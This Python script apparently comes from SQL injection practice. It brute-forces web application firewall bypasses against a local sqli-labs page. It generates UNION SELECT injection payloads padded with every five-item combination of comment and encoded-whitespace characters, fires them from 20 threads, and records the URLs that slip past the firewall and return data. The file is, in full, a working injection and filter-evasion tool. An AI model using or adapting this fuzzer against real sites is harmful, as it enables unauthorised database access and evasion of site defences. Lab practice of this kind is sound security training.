import requests
import time
from concurrent.futures import ThreadPoolExecutor,ProcessPoolExecutor
import sys

MAX_JOBS_IN_QUEUE = 1000
url="http://192.168.37.132/sqli-labs-master/Less-1/?id=1"
fuzz_zs = ['/*','*/','/*!','?','/**/','/','*','!','%','%a0']
fuzz_sz = ['0','6','7','8','9']
fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g"]
Fuzz = fuzz_ch + fuzz_zs

print(Fuzz)
print("start:")
start_time=time.time()

def request_url(url):
    s=requests.get(url).text
    if "网站防火墙" not in s:
        #print "no:"+url
        if "Your Login name" in s:
            print url
            with open("a.txt","a+") as f:
                f.write(url)
                f.write("\n")
                f.close()

#Fuzz=list(set(Fuzz))

num=0
length=len(Fuzz)**5
with ThreadPoolExecutor(20) as executor:
    for a in Fuzz:
        for b in Fuzz:
            for c in Fuzz:
                for d in Fuzz:
                    for e in Fuzz:
                        if num % 200000 == 0 and num > 10000:
                            end_time = time.time()
                            seconds = end_time - start_time
                            m, s = divmod(seconds, 60)
                            h, m = divmod(m, 60)
                            print ("%s:%s:%s" % (h, m, s))
                            # time.sleep(15)
                        try:
                            num = num + 1
                            exp = url + "' /*!union" + a + b + c + d + e+"select*/" + " 1,2,3 --+"
                            #exp = url + "' union/*!" + a + b + c + d + e"*/ select" + " 1,2,3 --+"
                            sys.stdout.write(' ' * 30 + '\r')
                            sys.stdout.flush()
                            sys.stdout.write("%s/%s \r" % (num, length))
                            sys.stdout.flush()
                            executor.submit(request_url, exp)
                            del exp
                        except Exception as e:
                            pass
